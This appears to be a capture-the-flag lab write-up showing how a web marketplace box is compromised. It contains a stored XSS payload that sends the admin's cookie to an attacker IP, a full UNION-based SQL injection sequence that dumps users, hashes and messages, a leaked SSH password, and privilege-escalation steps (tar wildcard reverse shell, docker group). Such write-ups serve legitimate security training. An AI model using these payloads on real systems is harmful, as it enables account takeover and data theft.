## Info
### Credential
 User | Password       | Service | Note
------|----------------|---------|------
  jake|@b_ENXkGYUCAv3zJ|         |

## Path
### Website Admin 
1. Listing on the website has XSS. We can post a listing with XSS in it, then report it to the admin to get admin's cookie and gain the access to the admin's account.
```javascript
<script>var i = new Image;i.src="http://10.9.1.102:9000/?"+document.cookie;</script>
```
2. The first flag is shown on the admin panel.

### User
1. At the admin panel, the parameter `user` at `/admin` has SQL injection.
```
# /admin?user=1"
Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"' at line 1
```
2. `1-- -` no error => Direct SQLi without escaping quote.
3. `1 or id=2-- -` no error => column name `id`.
4. `1 union select 1,2,3,4-- -` no error => 4 columns.
5. `1 union select 1,2,id,4 from users-- -` no error => table name `users`.
6. `1 union select id,2,3,4 from users where id=2 order by id DESC-- -` output user 2 info => use `ORDER BY` to leak info.
7. `1 union select id,password,3,4 from users where id=2 order by id DESC-- -` output user 2's encrypted password => leak password hash
8. `1 union select 99,@@version,3,4 order by id DESC-- -` => leak MySQL version `8.0.21`
9. `1 union select 99,database(),3,4 order by id DESC-- -` => leak database name `marketplace`
10. `1 union select 99,group_concat(table_name),3,4 from information_schema.tables where table_schema="marketplace" order by id DESC` => leak table names `items,messages,users`
11. `1 union select 99,group_concat(column_name),3,4 from information_schema.columns where table_name="messages" order by id DESC-- -` => leak the column names of `messages` table.
12. `1 union select 99,group_concat(message_content),3,4 from messages where id=1 order by id DESC-- -` => Get the password
```
Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.
Your new password is: @b_ENXkGYUCAv3zJ
```
13. `> 1 union select 99,group_concat(user_to),3,4 from messages where id=1 order by id DESC-- -` => The password is belonged to `jake`.
14. `ssh jake@$ip` and get the user flag.

### Root
1. We can run `/opt/backups/backup.sh` as user `michael`.
```bash
$ sudo -l
...
    (michael) NOPASSWD: /opt/backups/backup.sh
```
2. `michael` is belonged to `docker` group.
```bash
$ cat /etc/group
...
docker:x:999:marketplace,michael
```
3. Use tar wildcard technique to get `michael`'s reverse shell.
4. `michael` is belonged to `docker` group, so use the technique from GTFOBins to gain root.


